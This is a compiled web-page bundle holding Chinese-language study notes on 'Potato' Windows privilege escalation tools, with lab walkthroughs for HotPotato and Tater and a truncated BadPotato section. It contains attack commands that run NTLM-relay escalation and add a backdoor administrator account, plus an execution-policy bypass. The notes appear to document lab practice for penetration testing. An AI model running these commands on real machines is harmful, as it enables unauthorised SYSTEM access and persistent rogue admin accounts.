import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,a as l,b as e,f as t,d as r,e as o,r as p,o as d}from"./app-DX9gUdjC.js";const h={};function c(g,i){const s=p("RouteLink");return d(),n("div",null,[i[3]||(i[3]=l(`<h1 id="土豆提权" tabindex="-1"><a class="header-anchor" href="#土豆提权"><span>土豆提权</span></a></h1><ul><li><a href="#%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83">土豆提权</a><ul><li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li><li><a href="#windows-%E7%94%A8%E6%88%B7">Windows 用户</a></li><li><a href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90">利用前提</a></li><li><a href="#hotpotato">HotPotato</a><ul><li><a href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">影响范围</a></li><li><a href="#%E5%8E%9F%E7%90%86">原理</a></li><li><a href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B">利用过程</a></li></ul></li><li><a href="#tater">Tater</a><ul><li><a href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1">利用过程</a><ul><li><a href="#windows-7-%E4%BD%BF%E7%94%A8-trigger-1-nbns-wpad-bruteforce--windows-defender-signature-updates">Windows 7 使用 trigger 1 （NBNS WPAD Bruteforce + Windows Defender Signature Updates）</a></li><li><a href="#windows-10-using-trigger-2-webclient-service--scheduled-task">Windows 10 using trigger 2 (WebClient Service + Scheduled Task)</a></li><li><a href="#windows-7-using-trigger-1-and-udp-port-exhaustion">Windows 7 using trigger 1 and UDP port exhaustion</a></li></ul></li></ul></li><li><a href="#badpotato">BadPotato</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li></ul></li></ul></li></ul><hr><h2 id="概述" tabindex="-1"><a class="header-anchor" href="#概述"><span>概述</span></a></h2><table><thead><tr><th style="text-align:center;">工具</th><th style="text-align:center;">提权原理</th><th style="text-align:center;">适配系统版本</th><th style="text-align:center;">是否依赖网络</th></tr></thead><tbody><tr><td style="text-align:center;">Hot Potato</td><td style="text-align:center;">NTLM 中继</td><td style="text-align:center;">Windows 7/8/10(早期版本) / Server 2008/2012</td><td style="text-align:center;">是</td></tr><tr><td style="text-align:center;">Tater</td><td style="text-align:center;">NTLM 中继（改进版）</td><td style="text-align:center;">Windows 7 / Server 2008/2012</td><td style="text-align:center;">是</td></tr><tr><td style="text-align:center;">JuicyPotato</td><td style="text-align:center;">COM 对象 Token 劫持</td><td style="text-align:center;">Windows 7 / Server 2008/2016</td><td style="text-align:center;">否</td></tr><tr><td style="text-align:center;">SweetPotato</td><td style="text-align:center;">改进的 COM Token 劫持</td><td style="text-align:center;">Windows 10 / Server 2016/2019（部分）</td><td style="text-align:center;">否</td></tr><tr><td style="text-align:center;">RoguePotato</td><td style="text-align:center;">RPC + COM Token 劫持</td><td style="text-align:center;">Windows 10 / Server 2019</td><td style="text-align:center;">否</td></tr><tr><td style="text-align:center;">PrintSpoofer</td><td style="text-align:center;">Print Spooler 服务漏洞</td><td style="text-align:center;">Windows 10 / Server 2019</td><td style="text-align:center;">否</td></tr><tr><td style="text-align:center;">Rotten Potato</td><td style="text-align:center;"></td><td style="text-align:center;"></td><td style="text-align:center;"></td></tr></tbody></table><ol><li><p><strong>Hot Potato (2016)</strong></p><ul><li><strong>背景</strong>: Hot Potato 是最早的 “Potato” 系列工具之一，由 Casey Smith 等人开发，基于当时 Windows 系统中存在的 NTLM 中继攻击技术</li><li><strong>核心原理</strong>: 通过劫持本地网络流量，利用 DNS 欺骗和 NTLM 身份验证请求中继，将 SYSTEM 权限的服务身份验证请求重定向到攻击者控制的恶意服务</li><li><strong>支持版本</strong>: Windows 7/8/10(早期版本) / Server 2008/2012</li></ul></li><li><p><strong>Tater (2016)</strong></p><ul><li><strong>背景</strong>: Tater 是 Hot Potato 的改进版本，由 FoxGlove Security 推出。它修复了一些 Hot Potato 的运行稳定性问题</li><li><strong>改进点</strong>: <ul><li>增强兼容性，支持更多的 Windows 系统</li><li>提高攻击稳定性，减少因环境差异导致的失败</li><li><strong>支持版本</strong>: 与 Hot Potato 类似，但适配性更强</li></ul></li></ul></li><li><p><strong>JuicyPotato (2018)</strong></p><ul><li><strong>背景</strong>: JuicyPotato 是 Potato 家族中最知名的工具之一，由 <code>@_decoder</code> 和 <code>Gabetm</code> 发布。它脱离了 NTLM 中继的原始思路，改用 Windows COM 组件和 Token Manipulation 漏洞进行提权</li><li><strong>核心原理</strong>: <ol><li>利用 Windows COM 服务（如 DCOM 或 BITS）</li><li>请求 SYSTEM 权限的 COM 对象</li><li>劫持令牌执行代码</li></ol></li><li><strong>支持版本</strong>:</li></ul></li><li><p><strong>SweetPotato (2019)</strong></p><ul><li><strong>背景</strong>: SweetPotato 是 JuicyPotato 的改进版本，针对 JuicyPotato 在某些系统上失效的问题进行了优化。</li><li><strong>改进点</strong>: 支持 Windows 10 和 Windows Server 2019（部分版本）</li><li>增加对不同 COM 接口的利用（例如 PrintNotify）</li><li><strong>支持版本</strong>: Windows 10（部分早期版本）Windows Server 2016/2019（特定版本）</li></ul></li></ol><hr><h2 id="windows-用户" tabindex="-1"><a class="header-anchor" href="#windows-用户"><span>Windows 用户</span></a></h2><ul><li><p><code>Local System - NT AUTHORITY\\SYSTEM</code>：Windows 操作系统中权限最高的内置账户，也称为本地系统账户。它对本地计算机拥有完全的控制权，可以执行任何操作，包括访问系统的所有资源、安装和卸载程序、修改系统设置等。</p><p>通常用于运行系统关键服务和进程，如 Windows 操作系统的核心组件、系统服务等。这些服务需要最高的权限来确保系统的正常运行和稳定性。</p></li><li><p><code>Network Service - NT AUTHORITY\\Network Service</code>: 该账户是用于运行网络相关服务的内置账户，具有一定的网络访问权限，但权限相对较低。它在网络环境中以匿名身份运行，无法直接访问本地计算机的用户资源。</p><p>主要用于运行一些需要网络访问权限的服务，如 IIS（Internet Information Services）、SQL Server 等。这些服务需要与网络中的其他计算机进行通信，但不需要访问本地用户的敏感信息。</p></li><li><p><code>Local Service - NT AUTHORITY\\Local Service</code>：此账户是用于运行本地服务的内置账户，具有有限的本地系统权限，无法直接访问网络资源。它主要用于运行一些不需要网络访问权限的本地服务，如 Windows Time 服务、Print Spoofer 服务等。</p></li></ul><p>在实际渗透过程中，拿到 webshell ，用户权限是 IIS 或者 apache，或sqlserver用户执行 xp_cmdshell，此时拿到的服务账户在进行操作时是低权限账户，可以尝试使用提权手法获取更高的权限。</p><hr><h2 id="利用前提" tabindex="-1"><a class="header-anchor" href="#利用前提"><span>利用前提</span></a></h2><p>除了 HotPotato 没有权限要求外，利用 Potato 提权的前提是拥有 <code>SeImpersonatePrivilege（身份验证后模拟客户端）</code>或 <code>SeAssignPrimaryTokenPrivilege（替换一个进程级令牌）</code>权限</p><p>以下用户拥有 <strong>SeImpersonatePrivilege（身份验证后模拟客户端）</strong> 权限（而只有更高权限的账户比如 SYSTEM 才有 <strong>SeAssignPrimaryTokenPrivilege（替换一个进程级令牌）</strong> 权限）：</p><ul><li><p><code>Administrator(管理Windows计算机的内置管理员账户)</code></p></li><li><p>\`\`Local Service 本地服务账户\`</p></li><li><p><code>Network Service 网络服务用户 </code></p><p>该用户起的进程有如下这些：</p><ul><li>WMI</li><li>RPC</li></ul></li><li><p><code>NT AUTHORITY\\SYSTEM</code></p><p>该用户起的进程有如下这些：</p><ul><li>服务控制管理器 SCM</li><li>打印机服务 Print Spooler</li></ul></li></ul><blockquote><ul><li><p><code>Administrator</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251809218.png" alt="企业微信截图_11f20a22-003d-4d63-8978-d623fc983d33"></p></li><li><p>SCM</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251817435.png" alt="企业微信截图_20e9b4bb-d969-4907-af51-fd0cc57f66e7"></p></li><li><p>WMI</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251810440.png" alt="image-20241225181022364"></p></li><li><p>RPC（Remote Procedure Call）远程过程调用</p><p>RPC 服务通常运行在托管服务的通用 Windows 进程 svchost.exe 中。</p><p><code>svchost.exe</code> 是一个系统核心进程，负责托管和运行基于 DLL 的服务。多个服务通常共用同一个 svchost.exe 实例</p><p>可以使用 <code>tasklist /svc</code> 命令查看每个 <code>svchost.exe</code> 实例中托管的服务</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tasklist </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">svc | findstr RpcSs</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>通过上述命令可以列出 RpcSs 对应的 <code>svchost.exe</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251826485.png" alt="image-20241225182643408"></p></li><li><p>Print Spooler</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251900819.png" alt="image-20241225190051695"></p></li></ul></blockquote><p>PS：本机测试时即使在本地策略中授予管理员组普通用户 SeImpersonatePrivilege 特权，在 cmd.exe 中 whoami /priv 也不显示该特权，且无法利用；而 SeAssignPrimaryTokenPrivilege 特权则可以正常授予普通用户。</p><p>查询本地管理员组用户：</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-LocalGroupMember</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Group </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Administrators&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">net localgroup Administrators</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251904690.png" alt="image-20241225190447614"></p><p>管理员组的 Administrator 用户是内置账户， 权限比组内的其他用户更多</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412251907098.png" alt="image-20241225190710009"></p><hr><h2 id="hotpotato" tabindex="-1"><a class="header-anchor" href="#hotpotato"><span>HotPotato</span></a></h2><blockquote><p><a href="https://forum.butian.net/share/860" target="_blank" rel="noopener noreferrer">Potato提权合集 / 奇安信攻防社区</a></p><p><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" target="_blank" rel="noopener noreferrer">Hot Potato – Windows Privilege Escalation / @breenmachine</a></p><p><a href="https://www.youtube.com/watch?v=pOuhpcG87G4" target="_blank" rel="noopener noreferrer">015. Hot Potato | Windows Privilege Escalation / root@kali / Youtube</a></p><p><a href="https://blog.csdn.net/weixin_45612728/article/details/123010630" target="_blank" rel="noopener noreferrer">域渗透之热土豆的提权-创建新用户 / CSDN</a></p><p><a href="https://www.bilibili.com/video/BV1rj411f7no/?vd_source=bb4d7b2841dd4d0035c93d44ba5cf11a" target="_blank" rel="noopener noreferrer">HotPotato提权 / whale_3070 / BiliBili</a></p></blockquote><p>HotPotato 利用 Windows 中的已知问题在默认配置中获得本地权限提升</p><blockquote><p>已知问题 -&gt; NTLM 中继(特别是 HTTP-&gt;SMB 中继)和 NBNS 欺骗</p></blockquote><p>攻击者可以在安装了Windows操作系统的工作站中将自己的低权限提升至<code>NT AUTHORITY\\SYSTEM</code></p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><p>Windows 7、8、10、Server 2008 和 Server 2012</p><hr><h3 id="原理" tabindex="-1"><a class="header-anchor" href="#原理"><span>原理</span></a></h3><p>HotPotato 利用 Windows 中的NTLM 中继(特别是 HTTP-&gt;SMB 中继)和 NBNS 欺骗在默认配置中获得本地权限提升</p><p>攻击者可以在安装了Windows操作系统的工作站中将自己的低权限提升至<code>NT AUTHORITY\\SYSTEM</code></p><hr><h3 id="利用过程" tabindex="-1"><a class="header-anchor" href="#利用过程"><span>利用过程</span></a></h3><blockquote><p>PS: 利用前先打快照，否则可能导致后续其他提权方案用不起来， 比如 Tater</p></blockquote><p>clone <a href="https://github.com/foxglovesec/Potato" target="_blank" rel="noopener noreferrer">HotPotato仓库</a> 到靶机，进入 <code>source\\Potato\\Potato\\bin\\Release</code> 目录可以看到 <code>Potato.exe</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412121644967.png" alt="image-20241212164455685"></p><p>准备一个上线马执行如下命令</p><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" data-title="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Potato.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ip</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [本机ip] -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cmd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;命令行（可执行程序路径）&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">enable_httpserver</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">enable_defender</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">enable_spoof</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">enable_exhaust</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> true</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412121646221.png" alt="image-20241212164640183"></p><hr><p>或者尝试新建一个用户:</p><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" data-title="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Potato.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 192.168.198.135</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">disable_exhaust</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cmd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\Windows\\System32\\cmd.exe /K net user test 123.com /add &amp;&amp; net localgroup administrators test /add&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412190142338.png" alt="image-20241219014210236"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412190143970.png" alt="image-20241219014314907"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412190146440.png" alt="image-20241219014611399"></p><hr><h2 id="tater" tabindex="-1"><a class="header-anchor" href="#tater"><span>Tater</span></a></h2><blockquote><p><a href="https://github.com/Kevin-Robertson/Tater" target="_blank" rel="noopener noreferrer">Tater / Kevin-Robertson / Github</a></p><p><a href="https://www.bilibili.com/video/BV1rj411f7no/?vd_source=bb4d7b2841dd4d0035c93d44ba5cf11a" target="_blank" rel="noopener noreferrer">HotPotato提权 / whale_3070 / BiliBili</a></p></blockquote><hr><h3 id="利用过程-1" tabindex="-1"><a class="header-anchor" href="#利用过程-1"><span>利用过程</span></a></h3><blockquote><p>需要注意的是如果机子尝试了 Hotpotato 提权, 那么可能导致 Tater 这里提权失败 尝试前先打快照，避免影响其他用例</p></blockquote><p>Clone <a href="https://github.com/Kevin-Robertson/Tater" target="_blank" rel="noopener noreferrer">Tater / Kevin-Robertson / Github</a> 到本地，打开 powershell 并 cd 到项目根目录， 或者单独把 <code>Tater.ps1</code> 取出来也是一样的</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412131621980.png" alt="image-20241213162121820"></p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 加载 Tater.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Tater.ps1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">## 或者用 . ./Tater.ps1 也可以</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h4 id="windows-7-使用-trigger-1-nbns-wpad-bruteforce-windows-defender-signature-updates" tabindex="-1"><a class="header-anchor" href="#windows-7-使用-trigger-1-nbns-wpad-bruteforce-windows-defender-signature-updates"><span>Windows 7 使用 trigger 1 （NBNS WPAD Bruteforce + Windows Defender Signature Updates）</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">net</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> localgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> administrators</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> .</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\T</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ater.ps1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Invoke-Tater</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Command</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;net user tatertest testpass /add &amp;&amp; net localgroup administrators tatertest /add&quot;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">net</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> localgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> administrators</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412190229047.png" alt="image-20241219022950977"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412190235347.png" alt="image-20241219023500296"></p><hr><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412131741991.png" alt="image-20241213174137926"></p><blockquote><p>PS: 如果报错禁止执行脚本的话需要设置下 ExecutionPolicy</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># (需要管理员权限)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-ExecutionPolicy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Unrestricted </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">force</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># (不需要管理员权限)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-ExecutionPolicy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Unrestricted </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Scope CurrentUser</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412131724596.png" alt="image-20241213172422464"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412131725342.png" alt="image-20241213172544267"></p></blockquote><hr><h4 id="windows-10-using-trigger-2-webclient-service-scheduled-task" tabindex="-1"><a class="header-anchor" href="#windows-10-using-trigger-2-webclient-service-scheduled-task"><span>Windows 10 using trigger 2 (WebClient Service + Scheduled Task)</span></a></h4><blockquote><p><a href="https://github.com/Kevin-Robertson/Tater/issues/2" target="_blank" rel="noopener noreferrer">New Windows10 Trigger #2 / github.com/Kevin-Robertson/Tater/issue</a></p></blockquote><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">net localgroup administrators</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">. .\\Tater.ps1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">## 如果上一步执行报错则执行此命令，否则跳过</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-ExecutionPolicy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Unrestricted </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Scope CurrentUser</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Invoke-Tater</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Command </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;net user tatertest testpass /add &amp;&amp; net localgroup administrators tatertest /add&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">trigger </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">net localgroup administrators</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412171128371.png" alt="0e8fb956703b224d8497fc539c7d5ff0"></p><blockquote><p>TODO: 可能是系统版本太高了没成功， 这里需要一个成功的图</p></blockquote><hr><h4 id="windows-7-using-trigger-1-and-udp-port-exhaustion" tabindex="-1"><a class="header-anchor" href="#windows-7-using-trigger-1-and-udp-port-exhaustion"><span>Windows 7 using trigger 1 and UDP port exhaustion</span></a></h4><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 加载 Tater.ps1 脚本。</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">. .\\Tater.ps1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 如果加载 Tater.ps1 时出错，请运行 Set-ExecutionPolicy 命令以解除限制。</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-ExecutionPolicy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Unrestricted </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Scope CurrentUser</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 检查当前本地管理员组的成员。</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">net localgroup administrators</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 使用 Invoke-Tater 添加一个新用户 &#39;tatertest&#39;，密码为 &#39;testpass&#39;，并将该用户添加到本地管理员组。</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Invoke-Tater</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Command </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;net user tatertest testpass /add &amp;&amp; net localgroup administrators tatertest /add&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">exhaustudp y</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Invoke-Tater -Command &quot;net user tatertest2 testpass /add &amp;&amp; net localgroup administrators tatertest /add&quot; -exhaustudp y</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">net localgroup administrators</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412191754373.png" alt="image-20241219175445327"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202412191759931.png" alt="image-20241219175903827"></p><hr><h2 id="badpotato" tabindex="-1"><a class="header-anchor" href="#badpotato"><span>BadPotato</span></a></h2><blockquote><p><a href="https://github.com/BeichenDream/BadPotato" target="_blank" rel="noopener noreferrer">BadPotato / BeichenDream / Github </a></p><p><a href="https://www.atomicredteam.io/atomic-red-team/atomics/T1134.001#atomic-test-4---bad-potato" target="_blank" rel="noopener noreferrer">Atomic Test #4 - Bad Potato / Atomic Red Team</a></p><p><a href="https://blog.csdn.net/qq_18811919/article/details/135290115" target="_blank" rel="noopener noreferrer">Potato提权(原理简述) / 虚构之人 / CSDN</a></p><p><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener noreferrer">PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 / itm4n&#39;s blog itm4n 的博客</a></p></blockquote><ul><li><p>目标系统</p><ul><li>Windows 2012-2019</li><li>Windows 8-10</li></ul></li><li><p>效果图：</p><p><img 